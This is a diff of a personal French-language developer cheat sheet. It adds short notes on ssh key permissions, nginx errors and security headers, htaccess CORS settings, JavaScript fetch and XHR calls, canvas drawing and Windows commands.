@@ -25730,7 +25759,7 @@ ssh : se logger sur une machine a distance par le port 22
                     ssh-keygen -t rsa //il demande ou je veux stoker ma paire de cle et par defaut stocke la cle privee sous /repertoireHomeDuUser/.ssh/id_rsa ou toto_rsa et la cle publique sous /repertoireHomeDuUser/.ssh/id_rsa.pub  (creer ces fichiers si n'existent pas) //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
                     definir passphrase (sauf si c'est pour faire du ssh rsync scp etc... avec un autre serveur, alors ne pas mettre de mot de passe!)
                     cle prive est dans id_rsa, la cle publique corresp est dans id_rsa.pub. //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
-                    ssh-keygen -y -f id_rsa > id_rsa.pub // ensuite je peux copier cette cle publique et la mettre sur un autre serveur LINKmljsdf
+                    ssh-keygen -y -f id_rsa > id_rsa.pub // ensuite je peux copier cette cle publique et la mettre sur un autre serveur LINKmljsdf // si message are too open Not accessibe by others je dois faire chmod 600 sur mes cles privees (et peut etre doivent etre sous repertoire ~/.ssh)
                     On ne peut pas mettre plusieurs cles privées dans id_rsa:dans ce cas faire un fichier .ssh/config avec dedans:
                           Host memoclap www.memoclap.com  //Host petit_nom nom_de_domaine
                           HostName www.memoclap.com       //HostName nom_de_domaine
@@ -26972,6 +27001,7 @@ Allow /unrepertoire/unautrerepertoireLeSeulAEtreVisible/
 Dissalow etc...
 
 NGNIX : nginx :
+	si erreur  113 no route to host : redemarrer nginx car peut etre que j'ai redemarré son target sans redemarrer nginx donc besoin rafraichir
 	fichier conf.d: exemple de configuration
 	upstream unnomupstream{
 		server unhostdestination:8080; // unhost et son port dans le cas de docker c'est le nom du service docker compose ou bien le nom du container les deux fonctionnent. Attention dans le cas de docker compose le port c'est pas celui de l'host qu'il faut mettre mais celui ouvert DANS le container
@@ -26979,7 +27009,7 @@ NGNIX : nginx :
 	server { // je peux faire plusieurs block de serveur pour le meme port mais des domaines_sous domaines differents.
 	   listen 80;
 	   listen [::]:80;//facultatif
-	   server_name www.undomaine.com undomaine.com; 
+	   server_name www.undomaine.com undomaine.com; // mais si je suis en local je pourrais toujours utiliser sur mon browser localhost
 	   client_max_body_size 50M; // si mes requetes posts sont trop grosses en taille nginx bloque avec ce message "client intended to send too large body".  Pour resoudre utiliser ca.
 	   return 301 https://$host$request_uri; // redirection https peut etre utilisee pour faire tout type de redirection d'url exemple: return 301 https://$host/wwwconnect; return prend le pas sur location si les deux sont au meme niveau quelquesoit l'ordre. on peut mettre le return dans un location
 		ou
@@ -27014,7 +27044,7 @@ NGNIX : nginx :
 
 		# Aditional Security Headers
 		# ref: https://developer.mozilla.org/en-US/docs/Security/HTTP_Strict_Transport_Security
-		add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
+		add_header Strict-Transport-Security "max-age=31536000; includeSubDomains"; LINKlgjglgj
 
 		# ref: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
 		add_header X-Frame-Options DENY always; ou SAMEORIGIN (jecrois) voir LINKxframeiframe
@@ -27023,7 +27053,7 @@ NGNIX : nginx :
 		add_header X-Content-Type-Options nosniff always;
 
 		# ref: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
-		add_header X-Xss-Protection "1; mode=block" always;
+		add_header X-Xss-Protection "1; mode=block" always; // demande au browser de na pas envoyer requete page-> serveur si la requete contient du html ou du javascript. marche pas sur firefox et est remplacé par CSP
 
 		# Enable OCSP stapling 
 		# ref. http://blog.mozilla.org/security/2013/07/29/ocsp-stapling-in-firefox
@@ -27114,8 +27144,8 @@ htaccess :   super outil de test:https://htaccess.madewithlove.be/   LINKrewri99
 Autoriser le cross-domain: si par exemple le canvas fait une erreur tainted canvas etc... CORS
     dans .htaccess
     <IfModule mod_headers.c>
-       Header set Access-Control-Allow-Origin * // on peut utiliser les wild card  wildcard ici comme par ex *.memoclap.com en utilisant au max une regexp  pour limiter le hack
-        Header set Access-Control-Allow-Credentials true
+       Header set Access-Control-Allow-Origin * // on peut utiliser les wild card  wildcard ici comme par ex *.memoclap.com en utilisant au max une regexp  pour limiter le hack et privilegier * que sur destinations à vocation open. De toute facon un browser n'enverra jamais les credentials dans une requete qui a Access-Control-Allow-Origin=* et Access-Control-Allow-Credentials=true
+        Header set Access-Control-Allow-Credentials true // si true le browser envera les cookies dans les headers des requetes dont l'origine est la meme. Sinon jamais.
     </IfModule>
     il est prioritaire sur ce qu'on peut mettre dans une page php comme par exemple 
       header('Access-Control-Allow-Origin: *');// a mettre si apres avoir mais dans htaccess ca ne marche toujours pas */
@@ -27821,6 +27851,8 @@ HTML :
  faire des iconnes icones cools
 	https://icomoon.io/app/#/select > icomoon App (je n'ai pas de compte)
 	je peux importer/exporter le icomoon_selection.json
+balise range:
+	<input type="range" min="1" max="2001" value="900" step="100" id="gifSpeed" style="display:block"/>
 svg :
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" stroke-linejoin="round">
    <rect x="50" y="20" width="150" height="150" 
@@ -27917,24 +27949,36 @@ fetch : LINKsljqffetch
             en mode synchro:
                         async function mamethode() { 
                               const response = await fetch("/hello");
-                              const greeting ou {greeting}  = await response.json(); ou response.text().then(function(texte){...pas reussi a utiliser await pour text})
+                              const {greeting}  = await response.json(); ou const greeting= response.text().then(function(texte){return texte;})
                               this.innerHTML = `
                                   <h2>${greeting}</h2>
                               `;
-                        ou en mode callback:
-               fetch(url,{
-              method:'GET',
-              credentials:'omit'// sans jsessionid ni cookies ou 'same-origin' ou 'include'//tout le temps meme en cross-origin CORS
-          })
-          .then(response=>response.json()) // attention renvoit une promesse a retraiter comme telle car en fait response contient le header mais response.json() fait appel à recup la promesse du body
-          .then((json)=>{
-            (new AlertMessage()).appear(json.message);
-		si on fait un download de fichier LINKfetchdownloadfile
-			let file=window.URL.createObjectURL(jsonQuiEstEnFaitUnBlobDuBodyDeLaResponse);
-			window.location.assign(file);
-           })
-           .catch(err=>{(new AlertMessage()).appear("Erreur: "+err );});
-     }
+                        ou en mode callback: GET
+				en condensé: const {res} = await fetch(pageContextRequestContextPath+"/getstripepk").then(r=>r.json());
+						const pkStripe = await fetch(pageContextRequestContextPath+"/getstripepk").then(r=>r.text());
+				en etallé:
+				       fetch(url,{
+				      method:'GET',
+				      credentials:'omit'// sans jsessionid ni cookies ou 'same-origin' ou 'include'//tout le temps meme en cross-origin CORS
+				  })
+				  .then(response=>response.json()) // attention renvoit une promesse a retraiter comme telle car en fait response contient le header mais response.json() fait appel à recup la promesse du body
+				  .then((json)=>{
+				    (new AlertMessage()).appear(json.message);
+					si on fait un download de fichier LINKfetchdownloadfile
+						let file=window.URL.createObjectURL(jsonQuiEstEnFaitUnBlobDuBodyDeLaResponse);
+						window.location.assign(file);
+				   })
+				   .catch(err=>{(new AlertMessage()).appear("Erreur: "+err );});
+			     }
+				POST:
+					const { error: backendError, clientSecret } = await fetch(pageContextRequestContextPath + "/stripegetclientsecretkey", {
+						method: "POST",
+						headers: {
+							"content-type": "application/json",
+						},
+						body: JSON.stringify({paymentMethodType: "card", currency: "eur",}) // se recupere cote servlet dans le payload:LINK564894
+					}).then(r => r.json());
+								
 duree d'une balise audio: 
 	<audio>.... document.querySelector("audio").duration;
 	<audio controls="controls" ontimeupdate = "..." onpause="..." onplay="..." onended="...">
@@ -27964,6 +28008,7 @@ ajax : // xmlhttprequest est remplacé maintenant par fetch (voir LINKsljqffetch
                               xhr.setRequestHeader("X-File-Type", file.type);*/
                             pour recuperer une valeur  :formData.get("fs")
                 	      var xhr = new XMLHttpRequest();
+				xhr.withCredentials=true; // envoie aussi les cookies dans la requete. je crois que par defaut c'est à true
 				xhr.open('POST', "AudioLoopOnlinePushAnsDRW.php", true);
 			      xhr.open('POST', "AudioLoopOnlinePushAnsDRW.php ou url", true); ou xhr.open('POST', form.action, true); // alors remplir le payload LINK564894 sauf si x-www-form-urlencoded// true  veut dire en mode asynchrone. false en mode synchrone mais attention ne pas mettre false dans le mainthread sinon j'ai l'erreur memoclap.js?version=2.20.28:6693 [Deprecation] Synchronous XMLHttpRequest on the main thread is deprecated because of its detrimental effects to the end user's experience. For more help, check https://xhr.spec.whatwg.org/.
 			      ou
@@ -29364,7 +29409,7 @@ pour faire un worker: workers : (web worker : web-worker : webworker :)
               }
             }
             this.addEventListener('message',messageHandler,false); (voir LINKaddevtlist)
-pour mettre une image dans un canvas:
+pour mettre une image dans un canvas :
    myimage = new Image();
    myimage.src="dina.jpg";
    // pour reinitialiser le canvas: faire un clear dessus: 
@@ -29408,7 +29453,7 @@ astuce pour que dans les boucles loop il y ait un timeout entre chaque boucle:
       {
         setTimeout(methodecallback, 3000 * i); // sans () à la methode
       };
-pour faire un paint avec canvas: Attention ne jamais donner un style a un canvas mais faire ca:  <canvas width="300" height="203" id="imageView">
+pour faire un paint avec canvas : Attention ne jamais donner un style a un canvas mais faire ca:  <canvas width="300" height="203" id="imageView">
                       <div>
                       <strong class='tooltipPere'><img src="crayon.png" class="button modifier"  onclick="dessiner()"/><div class='tooltipFilsAbs'>Dessiner</div></strong>                                                                                 
                       <strong class='tooltipPere'><img src="clavier.png" class="button modifier"  onclick="ecrire()"/><div class='tooltipFilsAbs'>Ecrire</div></strong>
@@ -29567,6 +29612,8 @@ pour faire un paint avec canvas: Attention ne jamais donner un style a un canvas
                                                                       {  
                                                                         context.lineTo(ev._x, ev._y);
                                                                         //context.lineTo(ev._x-70, ev._y);
+									context.fillRect(x - 10, y - 10, 20, 20); // ou ca 
+									context.arc(centerX, centerY, radius, 0, 2 * Math.PI, false); // ou ca pour faire un circle cercle: positionx, positiony, rayon, angle de depart, angle  de fin, sans horaire ou antihoraire
                                                                         context.stroke();
                                                                       }
                                                             };
@@ -29853,12 +29900,11 @@ nouvelle facon de definir les classes et l'heritage: mais en javascript on peut 
           tals(){blabla} // override la methode tals du parent
        }
  
- heritage avec de purs objets (duck typing) (import et export ne marche qu'avec un petit serveur (npm))
-  export var Toto ={                   
-          this.sound="zzzz" // apparemment ne marche plus (this genere erreur)
-          tals(){alert(this.sound)},
-          zozo(){xxx}
-          let huhu = this.tintin(); // tintin peut etre defini ou overridé dans une sous classe
+ heritage avec de purs objets (duck typing) (import et export ne marche qu'avec un petit serveur (npm)) // bof eviter ce truc dans une classe en tout cas
+  export var Toto ={    //ici si Toto est dans une classe ne pas mettre this.Toto =  ca ne marche pas mais var Toto direct
+          tals: function(){alert(this.sound)},
+          zozo:function(){xxx},
+          huhu:this.tintin() // tintin peut etre defini ou overridé dans une sous classe
           };
           ggg= Toto
           ggg.tals()
@@ -34649,12 +34695,10 @@ pour que windows7 recherche aussi dans le contenu des fichiers:
       C:\>echo %ANT_HOME%
 pour savoir quelle est ma carte mere
   executer windows>msinfo32
-
-
 afficher les extensions dans l'explorateur
     organize >folder and search option >view etc...
-voir les variables d'environnement
-  SET
+voir afficher les variables d'environnement et les paths
+  set
 empecher redimensionnement fenetres 
     panneau de conf > souris
 pour faire un clear clean de la console: 
